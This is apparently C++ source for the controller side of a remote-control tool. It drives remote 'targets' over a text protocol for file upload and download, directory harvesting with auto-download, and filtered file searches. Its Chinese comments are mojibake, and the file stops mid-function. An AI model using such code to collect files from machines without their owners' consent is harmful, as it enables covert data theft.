//---------------------------------------------------------------------------

#include "adkprecomp.h"
#include "maindlg.h"
#include "targetdlg.h"
#include "TargetConnection.h"
#include "ControlConnection.h"
#include "Utility.h"
#include "DatabaseManager.h"
#include "include/errorcode.h"

static std::map<std::string, TargetCmdHandler>  t_commandHandlers;

//---------------------------------------------------------------------------

 TargetConnection::TargetConnection(SOCKET sock, DWORD dwTargetId)
    : Connection(sock)
{
    RegisterCommandHandlers();

	InitializeCriticalSection(&csTarConn);
    
    this->readBuf = (char *) malloc(8192);
    this->ownerTarget = GetTargetFromGlobalMap(dwTargetId);
}
//---------------------------------------------------------------------------
 TargetConnection::~TargetConnection()
{
    if (this->ownerTarget->tarConn == this)
    {
        this->ownerTarget->tarConn = NULL;
    }

    if (this->readBuf)
    {
        free(this->readBuf);
        this->readBuf = NULL;
    }

	DeleteCriticalSection(&csTarConn);
}

 void TargetConnection::FlowStatistics(unsigned int bytes)
 {
	 this->ownerTarget->FlowStatistics(bytes);
 }

//---------------------------------------------------------------------------
void  TargetConnection::RegisterCommandHandlers()
{
    if (t_commandHandlers.size() == 0)
    {
        t_commandHandlers["QNG"] = &TargetConnection::Handle_QNG;
        t_commandHandlers["HEL"] = &TargetConnection::Handle_HEL;

        t_commandHandlers["SCH"] = &TargetConnection::Handle_SCH;
        t_commandHandlers["FTS"] = &TargetConnection::Handle_FTS;
                       
        t_commandHandlers["FTK"] = &TargetConnection::Handle_FTK;
        t_commandHandlers["DTK"] = &TargetConnection::Handle_DTK;
        t_commandHandlers["STK"] = &TargetConnection::Handle_STK;

        t_commandHandlers["AFT"] = &TargetConnection::Handle_AFT;
        t_commandHandlers["ADT"] = &TargetConnection::Handle_ADT;
        t_commandHandlers["AST"] = &TargetConnection::Handle_AST;
        
        t_commandHandlers["CFT"] = &TargetConnection::Handle_CFT;
        t_commandHandlers["PFT"] = &TargetConnection::Handle_PFT;
        t_commandHandlers["RFT"] = &TargetConnection::Handle_RFT;

        // File Task Operation
        //
        t_commandHandlers["UPL"] = &TargetConnection::Handle_UPL;
        t_commandHandlers["DOW"] = &TargetConnection::Handle_DOW;

        t_commandHandlers["FDT"] = &TargetConnection::Handle_FDT;
	}
}
//---------------------------------------------------------------------------
void  TargetConnection::HandleIncomingData()
{
    while (IsWholeLineAvailable())
    {
		std::vector<std::string> args = GetLine();

		//  @@Note: COMMAND Format:
		//
		//  Target_id Plugin_id   CMD     Trid    Param ....
		//      0        1         2       3        4
		//
        //  Target_id:
        //        0   ----   Daemon self
        //        n   ----   Data is from target N
		//  Plugin_id:
		//        0   ----   Base Plugin (Daemon'self)
		//		1 - n ----   External Plugins
		//

        // Directly Get CMD Handler 
        //
        if (-1 == DispatchCommand(args))
        {
            return;
        }
	}
}
//---------------------------------------------------------------------------
int   TargetConnection::DispatchCommand(std::vector<std::string> & args)
{
    std::map<std::string, TargetCmdHandler>::iterator i = t_commandHandlers.find(args[2]);
    if (i != t_commandHandlers.end())
    {
		if ( args.size() >= 3 )
		{
			//xTRACEA(("[T9000] [TargetConnection] TID : %s PID : %s CMD : %s\r\n", args[0].c_str(), args[1].c_str(), args[2].c_str()));
		}

        return (this->*t_commandHandlers[args[2]])(args);
    }

    return this->Handle_Plugin_CMD(args);
}
//---------------------------------------------------------------------------
void  TargetConnection::ConnectionCompleted()
{
    if (this->ownerTarget)
    {
        Send_Identity();
        Send_HEL();
    }
    else
    {
        this->CloseConnection();        // ˵��������һЩ�߽�����������ڽ���Ŀ���������ӵ�ͬʱ���û�����˸�Ŀ��
    }
}
//---------------------------------------------------------------------------
void  TargetConnection::ConnectionClosed()
{
    if (this->ownerTarget)
    {
        this->ownerTarget->TargetDataConnOffline();
        if (FrmMain->ctrOnlineFlag == true)
        {
            SendMessage(FrmMain->Handle, WM_TARGET_DATACONNCLOSED, (unsigned int)this->ownerTarget, NULL);
        }        
    }
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_Identity()
{
    std::ostringstream buf;
    buf << "0 0 IDE COFI\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_HEL()
{
    // TID PID HEL
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << this->ownerTarget->dwTargetID << " 1 HEL\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_HEL(std::vector<std::string> & args)
{
    // TID PID HEL Result
    //  0   1   2   3
    //

    int result = atoi(args[3].c_str());
    if (1 == result)
    {
        ownerTarget->tarConn = this;
        ownerTarget->TargetDataConnOnline();

        this->Send_DTK(ownerTarget->dwTargetID, 0, true);// ��ȡDirTask�б�
        this->Send_STK(ownerTarget->dwTargetID, 0);      // ��ȡSearchTask�б�
        this->Send_FTK(ownerTarget->dwTargetID, 0);      // ��ȡFileTask�б�
    }

	return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_STK(ULONG targetId, ULONG taskId)
{
    // TID PID STK TASKID
	//  0   1   2     3
	//
    std::ostringstream buf;
    buf << targetId << " 1 STK " << taskId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_DTK(ULONG targetId, ULONG taskId, BOOL bDetail)
{
    // TID PID DTK TASKID bDETAIL
	//  0   1   2     3      4
	//
    std::ostringstream buf;
    DWORD   dwDetail = 0;
    if (bDetail)
    {
        dwDetail = 1;
    }

    buf << targetId << " 1 DTK " << taskId << " " << dwDetail << "\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_FTK(ULONG targetId, ULONG taskId)
{
    // TID PID FTK
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 FTK " << taskId << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_FTK(std::vector<std::string> & args)
{
	// TID PID FTK TaskID TaskDirect TaskStatus CtrPATH TarPATH TotalLen  DaemonedLen FinishedLen ErrorID  TaskType ParentTaskID DaemonBufFinished
	//  0   1   2     3       4          5         6       7        8        9			10           11       12        13               14
	//

    if ( args.size() != 15 )
		return 0;

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        return 0;
    }

    ULONG       pluginID    = strtoul(args[1].c_str(), NULL, 10);
    ULONG       taskID      = strtoul(args[3].c_str(), NULL, 10);
    TaskStatus  taskStatus  = (TaskStatus)atoi(args[5].c_str());
    TaskType    taskType    = (TaskType)atoi(args[12].c_str());
    ULONG       parentTaskID = strtoul(args[13].c_str(), NULL, 10);

    bool bNewFileTask = false;
    TaskStatus oldStatus = WORKING;
    
    FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskID);
    if(fileTask == NULL)
    {
        fileTask = new FileTask();
        fileTask->dwPluginID  = pluginID;
        fileTask->dwTargetID  = targetID;
        fileTask->dwTaskID    = taskID;
        fileTask->dwParentID  = parentTaskID;

        if (args[4] == "DOW")
        {
            fileTask->taskDirect = FILEDOWN;
        }
        else
        {
            fileTask->taskDirect = FILEUP;
        }
        fileTask->taskType = taskType;

		fileTask->aniTmpTaskPath = tarBlock->aniLocalDataDir + "\\FileTasking\\" + QString("%1").arg(taskID).toStdString();
        fileTask->ctrPathW       = GetWideFromBase64(args[6].c_str());
        fileTask->tarPathW       = GetWideFromBase64(args[7].c_str());
        fileTask->hFile          = NULL;
        
        fileTask->dwCTHighDataTime = 0;
        fileTask->dwCTLowDataTime  = 0;
        fileTask->dwLWHighDataTime = 0;
        fileTask->dwLWLowDataTime  = 0;
        fileTask->dwLAHighDataTime = 0;
        fileTask->dwLALowDataTime  = 0;

        bNewFileTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)fileTask->taskStatus;
    }

    fileTask->taskStatus    = taskStatus;
    fileTask->dwTotalLen    = strtoul(args[8].c_str(),NULL,10);
    fileTask->dwDaemonedLen = strtoul(args[9].c_str(),NULL,10);
    fileTask->dwFinishedLen = strtoul(args[10].c_str(),NULL,10);
    fileTask->dwErrorID     = strtoul(args[11].c_str(),NULL,10);

    if (0 != fileTask->dwTotalLen)
    {
        fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
        fileTask->nDaemonedProp = (int)((double)(fileTask->dwDaemonedLen - fileTask->dwFinishedLen) /(double)fileTask->dwTotalLen * 100);
    }
    else
    {
        fileTask->nDaemonedProp = 100;    
        fileTask->nFinishedProp = 100;
    }

    ULONG dwDaeFinished = strtoul(args[14].c_str(), NULL, 10);
    if (dwDaeFinished == 0)
    {
        fileTask->bDaemonBufFinished = false;
    }
    else
    {
        fileTask->bDaemonBufFinished = true;
    }
    
    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // ���ڼ�FileTask, �����Ѿ�����Чʱ��֪ͨ��ת�����FileTask
        // ���ڸ���FileTask, ������ת�˵���������ϲ�Task��������Զ����
        //
        if (parentTaskID == 0)
        {
            this->Send_DFT(targetID, taskID, taskType);
            
            // ��¼FileTask�����ݿ���
            //
            DM->InsertFileTask(fileTask, args[6].c_str(), args[7].c_str());
        }
        else
        {
            // ���ڸ���Task����TASK����Ҫ�ȼ�������
            //
            DM->CheckAndInsertFileTask(fileTask, args[6].c_str(), args[7].c_str()); 
        }
    }    

    if (bNewFileTask)
    {
        tarBlock->AddFileTask(fileTask);
    }
    else
    {
        tarBlock->FileTaskStatusChanged(fileTask, oldStatus);   
    }


    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_DTK(std::vector<std::string> & args)
{
	// TID PID DTK TaskID TaskDirect TaskStatus TarDisPathBase64 LEVEL AutoDown  ErrorID  WorkingCount ErroredCount CanceledCount PausedCount FinishedCount
	//  0   1   2    3		   4		 5				6			7     8        9            10          11            12            13          14
	//
	if ( args.size() != 15 )
		return 0;

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG taskID = strtoul(args[3].c_str(), NULL, 10);
    TaskStatus taskStatus = (TaskStatus)atoi(args[5].c_str());
    DWORD   dwAutoDown = strtoul(args[8].c_str(), NULL, 10);

    bool bNewTask = false;
    TaskStatus oldStatus = WORKING;
    DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskID);
    if (dirTask == NULL)
    {
        dirTask  = new DirTask();
        dirTask->dwTargetID   = targetID;
        dirTask->dwTaskID     = taskID;
        dirTask->taskDirect   = FILEDOWN;
        
        dirTask->tarDirPathW  = GetWideFromBase64(args[6].c_str());

        dirTask->dwLevel = strtoul(args[7].c_str(), NULL, 10);
        dirTask->dwAutoDown = dwAutoDown;

        dirTask->lpInfoFileTask = NULL;

        dirTask->dwWorkingCount = 0;
        dirTask->dwErroredCount = 0;
        dirTask->dwCanceledCount = 0;
        dirTask->dwPausedCount = 0;
        dirTask->dwFinishedCount = 0;
        
        bNewTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)dirTask->taskStatus;

        xASSERT((dirTask->dwAutoDown == dwAutoDown));
    }

    if (dirTask->dwAutoDown == 1)
    {
        dirTask->dwWorkingCount = strtoul(args[10].c_str(), NULL, 10);
        dirTask->dwErroredCount = strtoul(args[11].c_str(), NULL, 10);
        dirTask->dwCanceledCount = strtoul(args[12].c_str(), NULL, 10);
        dirTask->dwPausedCount = strtoul(args[13].c_str(), NULL, 10);
        dirTask->dwFinishedCount = strtoul(args[14].c_str(), NULL, 10);
    }
    
    dirTask->taskStatus = taskStatus;
    dirTask->dwErrorID  = strtoul(args[9].c_str(), NULL, 10);

    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // �յ���ЧDirTaskʱ��֪ͨ��ת�����DirTask��������Task
        //
        this->Send_DFT(targetID, taskID, TASK_DIR);

        if (dirTask->dwAutoDown == 1)
        {
            DM->InsertDirDownTask(dirTask, args[6].c_str());
        }
        else
        {
            DM->InsertDirInfoTask(dirTask, args[6].c_str());
        }
    }
        
    if (bNewTask)
    {
        tarBlock->AddDirTask(dirTask);
    }
    else
    {
        // ���½���
        //
        if (tarBlock->frmTarControl && tarBlock->frmTarControl->Handle)
        {
            SendMessage(tarBlock->frmTarControl->Handle, WM_UPT_DIRTASK_STATISTIC, (unsigned int)dirTask, NULL);
        }

		tarBlock->DirFinished(dirTask, oldStatus);
    }

    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_STK(std::vector<std::string> & args)
{
	// TID PID STK TaskID TaskDirect TaskStatus TarDisPathBase64 LEVEL AutoDown ErrorID
	//  0   1   2    3		   4		 5				6			7     8        9

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   10        11      12           13        14         15          16         17
	//

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    bool bNewTask = false;
    TaskStatus oldStatus = WORKING;
    ULONG taskID = strtoul(args[3].c_str(), NULL, 10);
    PSearchTask lpSearchTask = tarBlock->GetSearchTaskFromMap(taskID);
    if (lpSearchTask == NULL)
    {
        lpSearchTask  = new SearchTask();
        lpSearchTask->dwTargetID   = targetID;
        lpSearchTask->dwTaskID     = taskID;
        lpSearchTask->taskDirect   = FILEDOWN;
        
        lpSearchTask->tarDirPathW  = GetWideFromBase64(args[6].c_str());

        lpSearchTask->dwLevel = strtoul(args[7].c_str(), NULL, 10);
        lpSearchTask->dwAutoDown = strtoul(args[8].c_str(), NULL, 10);

        lpSearchTask->lpInfoFileTask = NULL;

        // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
    	//   10        11      12           13        14         15          16         17
	    //

        lpSearchTask->ulMinSize = strtoul(args[10].c_str(), NULL, 10);
        lpSearchTask->ulMaxSize = strtoul(args[11].c_str(), NULL, 10);

        if (lpSearchTask->ulMinSize == 0 && lpSearchTask->ulMaxSize == 0)
        {
            lpSearchTask->bSizeFilter = false;
        }
        else
        {
            lpSearchTask->bSizeFilter = true;
        }

        lpSearchTask->ftBegTime.dwLowDateTime  = strtoul(args[12].c_str(), NULL, 10);
        lpSearchTask->ftBegTime.dwHighDateTime = strtoul(args[13].c_str(), NULL, 10);
        lpSearchTask->ftEndTime.dwLowDateTime  = strtoul(args[14].c_str(), NULL, 10);
        lpSearchTask->ftEndTime.dwHighDateTime = strtoul(args[15].c_str(), NULL, 10);

        if (lpSearchTask->ftBegTime.dwLowDateTime == 0
        &&  lpSearchTask->ftBegTime.dwHighDateTime == 0
        &&  lpSearchTask->ftEndTime.dwLowDateTime == 0
        &&  lpSearchTask->ftEndTime.dwHighDateTime == 0)
        {
            lpSearchTask->bTimeFilter = false;
        }
        else
        {
            lpSearchTask->bTimeFilter = true;
        }

        lpSearchTask->widName = GetWideFromBase64(args[16].c_str());

		if (lpSearchTask->widName == std::wstring(L"*"))
        {
            lpSearchTask->bNameFilter = false;
        }
        else
        {
            lpSearchTask->bNameFilter = true;
        }

        lpSearchTask->widType = GetWideFromBase64(args[17].c_str());

		if (lpSearchTask->widType == std::wstring(L"*"))
        {
            lpSearchTask->bTypeFilter = false;
        }
        else
        {
            lpSearchTask->bTypeFilter = true;
        }

        bNewTask = true;
    }
    else
    {
        oldStatus = (TaskStatus)lpSearchTask->taskStatus;
    }

    TaskStatus taskStatus = (TaskStatus)atoi(args[5].c_str());
    lpSearchTask->taskStatus = taskStatus;
    lpSearchTask->dwErrorID  = strtoul(args[9].c_str(), NULL, 10);

    if (taskStatus == ERRORED || taskStatus == FINISHED || taskStatus == CANCELED)
    {
        // �յ���ЧSearchTaskʱ��֪ͨ��ת�����SearchTask��������Task
        //
        this->Send_DFT(targetID, taskID, TASK_SEARCH);

        // ���浽���ݿ���
        //
        DM->InsertSearchTask(lpSearchTask, args[6].c_str(), args[16].c_str(), args[17].c_str());
    }

    if (bNewTask)
    {
        tarBlock->AddSearchTask(lpSearchTask);
    }
    else
    {
        tarBlock->SearchTaskStatusChanged(lpSearchTask, oldStatus);               
    }
        
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_AFT(ULONG        targetID,
                                            TaskDirect   taskDirect,
                                            const char*        ctrPathBase64,
                                            const char*        tarPathBase64,
                                            ULONG        totalLen)
{
	// TID PID AFT TASKDIRECT CTRPATH TARPATH TOTALLEN
	//  0   1   2      3        4        5        6
	//

    std::ostringstream buf;
    if (taskDirect == FILEDOWN)
    {
        buf << targetID << " 1 AFT DOW " << ctrPathBase64 << " " << tarPathBase64 << " " << totalLen << "\r\n";
    }
    else
    {
        buf << targetID << " 1 AFT UPL " << ctrPathBase64 << " " << tarPathBase64 << " " << totalLen << "\r\n";
    }
    
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_AFT(std::vector<std::string> & args)
{
	// TID PID AFT TASKDIRECT CTRPATH TARPATH TotalLen OK(ERR) [ERRID]
	//  0   1   2     3         4       5        6        7        8
	//

    if (args.size() != 8 && args.size() != 9)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect taskDirect = ConvertStrToTaskDirect(args[3]);
    std::wstring ctrPathW = GetWideFromBase64(args[4].c_str());
    std::wstring tarPathW  = GetWideFromBase64(args[5].c_str());

    if ("OK" == args[7])
    {
        if (taskDirect == FILEDOWN)
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�����ļ�����ָ�� - �����ļ�\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�����ļ��ϴ�ָ�� - �ϴ��ļ�\"%s\"��\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            ctrPathW.c_str(),
                                            tarPathW.c_str());
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[8].c_str(),NULL,10);

        if (taskDirect == FILEDOWN)
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] ����ļ�����ָ��ʧ�� - �����ļ�\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    ctrPathW.c_str(),
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
        else
        {

            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] ����ļ��ϴ�ָ��ʧ�� - �ϴ��ļ�\"%s\"��\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    ctrPathW.c_str(),
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());        
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ADT(ULONG      targetID,
                                            TaskDirect taskDirect,
                                            const char*      tarDirPathBase64,
                                            ULONG      level,
                                            ULONG      autoDown)
{
	// TID PID ADT TaskDirect TarDisPathBase64 LEVEL AutoDown
	//  0   1   2      3		   4		     5		6
	//

    std::ostringstream buf;
    buf << targetID << " 1 ADT DOW " << tarDirPathBase64 << " " << level << " " << autoDown << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_ADT(std::vector<std::string> & args)
{
	// TID PID ADT TaskDirect TarDisPathBase64 LEVEL FileDown OK(ERR) [ERRID]
	//  0   1   2     3		      4		        5	    6		7       8     
	//
    
    if (args.size() != 8 && args.size() != 9)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect  taskDirect  = ConvertStrToTaskDirect(args[3]);
    std::wstring  tarPathW    = GetWideFromBase64(args[4].c_str());
    DWORD       dwLevel     = strtoul(args[5].c_str(), NULL, 10);
    ULONG       dwAutoDown  = strtoul(args[6].c_str(), NULL, 10);

    if ("OK" == args[7])
    {
        if (dwAutoDown == 1)
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�������� - ����Ŀ¼\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�������� - ��ȡĿ¼\"%s\"��Ϣ",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[8].c_str(),NULL,10);

        if (dwAutoDown == 1)
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] �������ʧ�� - ����Ŀ¼\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
        else
        {
            SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] �������ʧ�� - ��ȡĿ¼\"%s\"��Ϣ! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
        }
    }

    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_AST(ULONG           targetID,
                                            TaskDirect      taskDirect,
                                            PCHAR           tarDirPathBase64,
                                            ULONG           level,
                                            PSearchFilter   lpSearchFilter,
                                            ULONG           autoDown)
{
	// TID PID AST TaskDirect TarDirPathBase64 LEVEL AutoDown
	//  0   1   2      3		      4		     5	     6	  

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64\r\n
	//   7        8        9           10          11         12           13          14
    
    xASSERT((lpSearchFilter));

    std::ostringstream buf;
    buf << targetID << " 1 AST DOW " << tarDirPathBase64 << " " << level << " " << autoDown 
        << " " << lpSearchFilter->dwMinSize << " " << lpSearchFilter->dwMaxSize
        << " " << lpSearchFilter->uliBegTime.LowPart << " " << lpSearchFilter->uliBegTime.HighPart
        << " " << lpSearchFilter->uliEndTime.LowPart << " " << lpSearchFilter->uliEndTime.HighPart
        << " " << GetBase64FromWide(lpSearchFilter->widName).c_str() << " " << GetBase64FromWide(lpSearchFilter->widType).c_str() << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_AST(std::vector<std::string> & args)
{
	// TID PID AST TaskDirect TarDirPathBase64 LEVEL AutoDown
	//  0   1   2      3		      4		     5	     6	  

    // MinSize MaxSize LowBegTime HighBegTime LowEndTime HighEndTime NameBase64 TypeBase64
	//   7        8        9           10          11         12           13          14
    
    // OK(ERR) [ERRID] \r\n
    //   15      16

    if (args.size() != 16 && args.size() != 17)
    {
        assert(false);
        return 0;
    }
    
    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    TaskDirect  taskDirect = ConvertStrToTaskDirect(args[3]);
    std::wstring  tarPathW   = GetWideFromBase64(args[4].c_str());
    DWORD       dwLevel    = strtoul(args[5].c_str(), NULL, 10);

    if ("OK" == args[15])
    {
        SetTarStatusInfoExW(STATUS_INFO, tarBlock, L"[Ŀ��%s(ID:%d)] �ɹ�����첽����ָ�� - ����Ŀ¼\"%s\"",
                                            tarBlock->widTargetName.c_str(),
                                            tarBlock->dwTargetID,
                                            tarPathW.c_str());
    }
    else
    {
        ULONG lastErrCode = strtoul(args[16].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] ����첽����ָ��ʧ�� - ����Ŀ¼\"%s\"! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    tarPathW.c_str(),
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;
}

//---------------------------------------------------------------------------
int   TargetConnection::Handle_SCH(std::vector<std::string> & args)
{
    // TID PID SCH
    //  0   1   2
    //

    // ֪ͨ���µ��ȣ����������Ҫ�����Ż��� @@@
    //
    ownerTarget->ReScheduleTarFileTask();

	return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_DOW(FileTask *fileTask, int startPos)
{
	// TID PID DOWF TaskID StartPos
	//  0   1   2     3       4
	//
    
    std::ostringstream buf;    
    buf << ownerTarget->dwTargetID << " 1 DOW " << fileTask->dwTaskID << " " << startPos << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_FDT(std::vector<std::string> & args)
{
	// TID PID FDT TaskID Base64Path  CTHighDataTime CTLowDataTime LWHighDataTime LWLowDataTime	LAHighDataTime LALowDataTime
	//  0   1   2    3			4			  5				6				7			  8				9			10
	//
        
    ULONG  taskID = strtoul(args[3].c_str(), NULL, 10);
    FileTask *lpFileTask = ownerTarget->GetFileTaskFromMap(taskID);
    if (lpFileTask)
    {
	    lpFileTask->dwCTHighDataTime = strtoul(args[5].c_str(), NULL, 10);
	    lpFileTask->dwCTLowDataTime  = strtoul(args[6].c_str(), NULL, 10);
	    lpFileTask->dwLWHighDataTime = strtoul(args[7].c_str(), NULL, 10);
	    lpFileTask->dwLWLowDataTime  = strtoul(args[8].c_str(), NULL, 10);
	    lpFileTask->dwLAHighDataTime = strtoul(args[9].c_str(), NULL, 10);
	    lpFileTask->dwLALowDataTime  = strtoul(args[10].c_str(), NULL, 10);
    }
    
    return 0;    
}
//---------------------------------------------------------------------------

void  TargetConnection::Send_CFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID CFT TASKID TASKDIRECT TASKTYPE
	//  0   1   2     3         4       5
    
    std::ostringstream buf;
    buf << dwTargetID << " 1 CFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_CFT(std::vector<std::string> & args)
{
	// TID PID CFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4      5        6 
    //
    
    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(), NULL, 10);
    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);
    
    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = CANCELED;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }

                // ֪ͨDaemonɾ������
                //
                this->Send_DFT(targetID, taskId, taskType);
            }
            break;
            
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = CANCELED;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
                
                // ֪ͨDaemonɾ������
                //
                this->Send_DFT(targetID, taskId, taskType);
            }
            break;
            
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);

                xASSERT((fileTask));

                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = CANCELED;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);

                    if (fileTask->dwParentID == 0)
                    {
                        // ֻɾ����ָ�����ָ�����ָ���ɸ���ָ����ʵʩ
                        //
                        this->Send_DFT(targetID, taskId, taskType);                    
                    }
                }
            }
            break;
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[Ŀ��%s(ID:%d)] ȡ������(ID: %d)ʧ��! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
        
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_PFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID PFT TASKID TASKTYPE
	//  0   1   2     3      4
    //

    std::ostringstream buf;
    buf << dwTargetID << " 1 PFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_PFT(std::vector<std::string> & args)
{
	// TID PID PFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4       5        6
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
